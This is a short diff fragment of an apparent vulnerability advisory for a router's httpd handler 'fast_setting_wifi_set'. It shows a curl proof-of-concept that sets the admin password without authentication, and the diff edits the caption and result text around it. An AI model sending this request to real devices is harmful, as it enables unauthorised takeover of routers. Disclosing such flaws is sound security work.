@@ -14,6 +14,4 @@ In the httpd binary, the function `form_fast_setting_wifi_set` handles requests 
 curl -i -X POST http://192.168.0.1/goform/fast_setting_wifi_set -d "ssid=anything&loginPwd=attacker_password"
 ```
 
-The admin password is now `attacker_password`.
-
-![Password changed without verification](screenshots/2.png)
+![PoC result](screenshots/2.png)
